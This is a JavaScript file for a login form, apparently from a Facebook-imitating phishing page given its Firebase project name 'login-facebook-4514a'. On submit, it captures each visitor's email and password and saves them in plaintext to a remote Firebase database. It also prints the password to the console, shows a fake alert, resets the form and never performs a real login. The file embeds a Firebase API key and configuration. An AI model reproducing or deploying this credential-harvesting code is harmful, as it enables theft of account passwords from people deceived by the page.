// Import necessary Firebase modules
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.19.0/firebase-database.js";

// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyAv05Mv06FT726l5ikdhiA2_UB3v-bgdbk",
    authDomain: "login-facebook-4514a.firebaseapp.com",
    databaseURL: "https://login-facebook-4514a-default-rtdb.firebaseio.com",
    projectId: "login-facebook-4514a",
    storageBucket: "login-facebook-4514a.appspot.com",
    messagingSenderId: "197979502021",
    appId: "1:197979502021:web:a83be7168b5a9460b447ac"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const logInDB = ref(db, 'logIn');

document.getElementById('login-form').addEventListener('submit', submitForm);

function submitForm(e) {
    e.preventDefault();

    const emailid = getElementVal('email');
    const password = getElementVal('password');

    saveMessages(emailid, password);

    // Enable alert 
    document.querySelector('.alert').style.display = "block";
    
    // Remove alert after 3 seconds
    setTimeout(() => {
        document.querySelector('.alert').style.display = "none";
    }, 3000);
    
    // Reset form
    document.getElementById("login-form").reset();

    console.log('Firebase initialized:', firebase.apps.length > 0);
console.log('Submitting form:', emailid, password);

    
}

const saveMessages = (emailid, password) => {
    const newLogIn = push(logInDB);

    set(newLogIn, {
        emailid: emailid,
        password: password
    });
};

const getElementVal = (id) => {
    return document.getElementById(id).value;
};
